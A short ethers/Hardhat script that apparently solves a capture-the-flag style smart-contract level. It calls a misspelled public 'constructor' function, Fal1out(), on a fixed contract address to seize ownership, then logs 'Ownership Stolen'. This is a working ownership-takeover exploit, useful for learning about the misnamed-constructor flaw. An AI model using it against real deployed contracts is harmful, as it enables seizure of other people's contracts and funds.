const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x50e1fD0Eb5FB223cD98D635259075047eFcb7A5e'
const abi = [
    "function Fal1out() public payable", 
    "function owner() public view returns (address)"
];

async function hack(contract, signer) {
    // The "constructor function" is spelled differently from the contract, so it's just a normal function anyone can access.
    const tx = await contract.Fal1out();
    await tx.wait();

    const owner = await contract.owner();
    console.log(`Ownership Stolen. New Owner: ${owner}`);
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})